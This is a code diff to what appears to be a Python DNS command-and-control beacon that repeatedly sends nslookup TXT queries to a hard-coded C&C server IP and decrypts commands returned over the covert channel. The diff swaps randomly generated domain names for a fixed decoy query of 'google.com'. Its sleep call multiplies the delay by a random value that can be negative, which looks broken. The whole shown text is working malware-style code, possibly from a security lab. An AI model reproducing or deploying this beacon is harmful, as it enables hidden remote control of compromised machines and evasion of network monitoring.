@@ -5,12 +5,9 @@ import random
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
-RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890'
-RAND_MIN_LEN = 50
-RAND_MAX_LEN = 57
-
 CCIP = '10.4.18.65'  # C&C Server
-QUERY_DELAY = 3  # In seconds
+QUERY_DELAY = 10  # In seconds
+DOMAIN_NAME = 'google.com'  # Fake domain name query
 
 lastcommand = ''  # The previous command received
 
@@ -81,14 +78,6 @@ def decrypt_command(encrypted):
     return originalcommand
 
 
-# Creates a random fake domain name
-def generate_randomname():
-    # Add random characters a random number of times
-    length = random.randrange(RAND_MIN_LEN, RAND_MAX_LEN)
-    name = ''.join(random.choice(RANDOM_CHARS) for i in range(length))
-    return name + random.choice(['.com', '.net', '.org', '.co.uk'])
-
-
 nfqueue = NetfilterQueue()
 
 
@@ -111,9 +100,8 @@ if __name__ == "__main__":
 
     while(True):
         try:
-            randomname = generate_randomname()
-            print('[+] Sending DNS query: ' + randomname)
-            os.system('nslookup -q=txt ' + randomname + ' ' + CCIP + ' > /dev/null')
+            print('[+] Sending DNS query: ' + DOMAIN_NAME)
+            os.system('nslookup -q=txt ' + DOMAIN_NAME + ' ' + CCIP + ' > /dev/null')
             time.sleep(random.uniform(-0.25, 0.25) * QUERY_DELAY)
         except KeyboardInterrupt:
             break
